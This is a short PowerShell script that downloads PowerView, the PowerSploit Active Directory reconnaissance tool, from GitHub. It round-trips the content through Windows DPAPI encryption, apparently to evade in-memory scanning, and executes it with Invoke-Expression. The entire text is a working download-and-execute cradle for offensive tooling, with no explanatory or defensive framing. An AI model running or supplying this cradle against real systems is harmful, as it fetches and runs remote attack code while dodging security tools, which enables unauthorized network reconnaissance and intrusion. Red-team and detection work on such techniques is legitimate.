Add-Type -AssemblyName System.Security
$Content = (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')

$Bytes = ([Text.Encoding]::ASCII).GetBytes($Content)
$EncryptedBytes = [Security.Cryptography.ProtectedData]::Protect($Bytes, $Null, [Security.Cryptography.DataProtectionScope]::LocalMachine)

IEX (([Text.Encoding]::ASCII).GetString([Security.Cryptography.ProtectedData]::Unprotect($EncryptedBytes, $Null, [Security.Cryptography.DataProtectionScope]::LocalMachine)))